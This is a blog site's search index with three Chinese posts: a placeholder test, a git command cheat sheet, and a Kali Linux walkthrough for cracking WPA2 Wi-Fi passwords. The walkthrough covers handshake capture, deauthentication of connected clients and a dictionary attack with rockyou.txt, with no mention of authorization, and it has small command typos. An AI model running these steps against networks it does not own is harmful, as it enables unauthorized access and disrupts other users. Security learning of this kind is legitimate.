<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="/2022/06/02/%E5%8D%9A%E5%AE%A2/test/"/>
      <url>/2022/06/02/%E5%8D%9A%E5%AE%A2/test/</url>
      
        <content type="html"><![CDATA[<p>123<br><img src="123.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/2022/04/12/%E5%8D%9A%E5%AE%A2/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/04/12/%E5%8D%9A%E5%AE%A2/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h2><ul><li>克隆master分支最新版本内容到本地<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --depth 1 xxx.git</span><br></pre></td></tr></table></figure></li></ul><h2 id="更新远程github库到本地"><a href="#更新远程github库到本地" class="headerlink" title="更新远程github库到本地"></a>更新远程github库到本地</h2><ul><li><p>1.查看是否有冲突</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br></pre></td></tr></table></figure></li><li><p>2.没冲突的话，直接到第三步，有冲突的话，想忽略本地的修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard origin/master</span><br></pre></td></tr></table></figure></li><li><p>2.1 不想忽略本地的修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add filename</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> commit -m <span class="string">"message"</span></span><br></pre></td></tr></table></figure></li><li><p>2.2 如果合并后觉得混乱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD</span><br></pre></td></tr></table></figure></li><li><p>3.想合并</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git stash   //备份当前的工作区的内容，从最近的一次提交中读取相关内容，让工作区保证和上次提交的内容一致。同时，将当前的工作区内容保存到Git栈中。</span><br><span class="line">$ git stash pop</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传本地的文件"><a href="#上传本地的文件" class="headerlink" title="上传本地的文件"></a>上传本地的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .</span><br><span class="line">$ git commit -m <span class="string">'something'</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><h2 id="上传大文件-超过100M的"><a href="#上传大文件-超过100M的" class="headerlink" title="上传大文件 超过100M的"></a>上传大文件 超过100M的</h2><ul><li>1.安装 git-lfs<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ brew install git-lfs</span><br><span class="line">$ git lfs track “*.zip” --这里的 “ *.zip <span class="string">" 就是要上传的大文件的路径</span></span><br></pre></td></tr></table></figure></li><li>2.这行忘记为什么要加了,可以试试不加,有遇到再试试<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add .gitattributes</span><br></pre></td></tr></table></figure></li><li>3.添加所要上传的文件后提交<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add demo.gif</span><br><span class="line">$ git commit -m <span class="string">"xxx"</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure></li></ul><h2 id="查看某个文件本次改变情况"><a href="#查看某个文件本次改变情况" class="headerlink" title="查看某个文件本次改变情况"></a>查看某个文件本次改变情况</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> -p filename</span><br></pre></td></tr></table></figure><h2 id="查看当前分支信息"><a href="#查看当前分支信息" class="headerlink" title="查看当前分支信息"></a>查看当前分支信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --list</span><br></pre></td></tr></table></figure><h2 id="查看处于哪个分支"><a href="#查看处于哪个分支" class="headerlink" title="查看处于哪个分支"></a>查看处于哪个分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch</span><br></pre></td></tr></table></figure><h2 id="创建并切换到新分支"><a href="#创建并切换到新分支" class="headerlink" title="创建并切换到新分支"></a>创建并切换到新分支</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b xxx</span><br></pre></td></tr></table></figure><h2 id="查看远程仓库地址"><a href="#查看远程仓库地址" class="headerlink" title="查看远程仓库地址"></a>查看远程仓库地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br></pre></td></tr></table></figure><h2 id="撤销git-add"><a href="#撤销git-add" class="headerlink" title="撤销git add"></a>撤销git add</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm --cached filename</span><br></pre></td></tr></table></figure><h2 id="如果撤销的是文件夹要加-r"><a href="#如果撤销的是文件夹要加-r" class="headerlink" title="如果撤销的是文件夹要加 -r"></a>如果撤销的是文件夹要加 -r</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git rm -r --cached floder</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Linux 渗透 Wifi 初探</title>
      <link href="/2020/04/17/%E5%8D%9A%E5%AE%A2/Kail-Linux-%E6%B8%97%E9%80%8F-Wifi-%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/04/17/%E5%8D%9A%E5%AE%A2/Kail-Linux-%E6%B8%97%E9%80%8F-Wifi-%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h3 id="先将无线网卡插入Kali-Linux，输入iwconfig命令查看得到，网卡名为wlan0"><a href="#先将无线网卡插入Kali-Linux，输入iwconfig命令查看得到，网卡名为wlan0" class="headerlink" title="先将无线网卡插入Kali Linux，输入iwconfig命令查看得到，网卡名为wlan0"></a>先将无线网卡插入Kali Linux，输入iwconfig命令查看得到，网卡名为wlan0</h3><h3 id="排除影响进行无线实验的因素"><a href="#排除影响进行无线实验的因素" class="headerlink" title="排除影响进行无线实验的因素"></a>排除影响进行无线实验的因素</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ service network-manager stop</span><br><span class="line">$ airmon-ng check <span class="built_in">kill</span></span><br></pre></td></tr></table></figure><h3 id="启动monitor模式"><a href="#启动monitor模式" class="headerlink" title="启动monitor模式"></a>启动monitor模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airman-ng start wlan0</span><br></pre></td></tr></table></figure><h3 id="抓包（扫描wifi）"><a href="#抓包（扫描wifi）" class="headerlink" title="抓包（扫描wifi）"></a>抓包（扫描wifi）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><h3 id="针对要破解的WiFi重新开启监听记录"><a href="#针对要破解的WiFi重新开启监听记录" class="headerlink" title="针对要破解的WiFi重新开启监听记录"></a>针对要破解的WiFi重新开启监听记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ airodump-ng -w 文件名 --bssid [路由器的MAC地址] -c [监听频道CH] wlan0mon</span><br></pre></td></tr></table></figure><h3 id="打开另一个shell窗口运行-强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包"><a href="#打开另一个shell窗口运行-强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包" class="headerlink" title="打开另一个shell窗口运行(强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包)"></a>打开另一个shell窗口运行(强制断开连接到路由器的设备，以便在它再次连接时捕获它的认证包)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aireplay-ng -0 1 -a [路由器的MAC地址] -c [客户端的MAC地址] wlan0mon</span><br></pre></td></tr></table></figure><h3 id="跑包测试加密的无线密码"><a href="#跑包测试加密的无线密码" class="headerlink" title="跑包测试加密的无线密码"></a>跑包测试加密的无线密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aircrack-ng -w [准备好的密码字典] [捕获到的数据包 .<span class="built_in">cap</span>后缀的]</span><br></pre></td></tr></table></figure><h3 id="Kali中几个常用的字典文件的位置："><a href="#Kali中几个常用的字典文件的位置：" class="headerlink" title="Kali中几个常用的字典文件的位置："></a>Kali中几个常用的字典文件的位置：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/password.lst</span><br><span class="line">/usr/share/wfuzz/wordlist</span><br><span class="line">/usr/share/wordlists</span><br><span class="line">/usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure><h3 id="破解例子"><a href="#破解例子" class="headerlink" title="破解例子"></a>破解例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/share/wordlists/ &amp;&amp; gunzip rockyou.txt.gz</span><br><span class="line">​$ aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2-01.cap</span><br></pre></td></tr></table></figure><h3 id="END-等待跑包吧。。"><a href="#END-等待跑包吧。。" class="headerlink" title="END 等待跑包吧。。"></a>END 等待跑包吧。。</h3>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
